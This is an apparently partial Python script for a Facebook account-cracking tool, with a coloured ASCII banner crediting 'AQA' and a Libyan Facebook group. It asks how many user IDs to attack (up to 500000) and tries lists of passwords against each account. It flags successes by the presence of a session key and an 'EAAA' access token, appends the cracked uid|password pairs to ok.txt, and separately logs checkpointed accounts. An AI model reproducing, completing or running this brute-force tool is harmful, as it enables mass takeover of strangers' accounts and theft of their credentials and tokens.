...
class Main:
 ...
 ██    ██      ██ ██   ██ ██  ██  ██ ██   ██
   ████   ███████ ██   ██ ██      ██ ██   ██   
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : OSᗩᗰᗩ-ZᗩᗰZᗩᗰ
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : LIBYA-1982 
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : AQA
...
\033[1;90m══════════════════════════════════════════════════
    ...
    def fbtua(self):
        ...
        xx = 999999999
        idx = "100000"
        limit = int(input("    \033[0;91m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 500000): "))
        try:
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write(
            "\r\r %s[>_] [AQA] : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]" % (
        ...
        for pw in pwx:
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r  \033[0;92m   [AQA-OK] %s | %s\033[0;97m         " % (uid, pw))
                self.ok.append("%s|%s" % (uid, pw))
                open("ok.txt", "a").write("  * --> %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r  \033[0;91m   [AQA-CP] %s | %s\033[0;97m         " % (uid, pw))
...
if len(sys.argv) == 2:
    if sys.argv[1] == "--info":
        ...
        print(" [*] Team      :  \n")
        print(" [ Sosial Medi  ] \n")
        print(" [*] Facebook  : https://facebook.com/AQA ")
        print(" [*] Instagram : https://instagram.com/AQA")
        print(" [*] YouTube   : https://youtube.com/AQA")
        exit(" [*] GitHub    : https://github.com/AQA")
    else:
        Main()
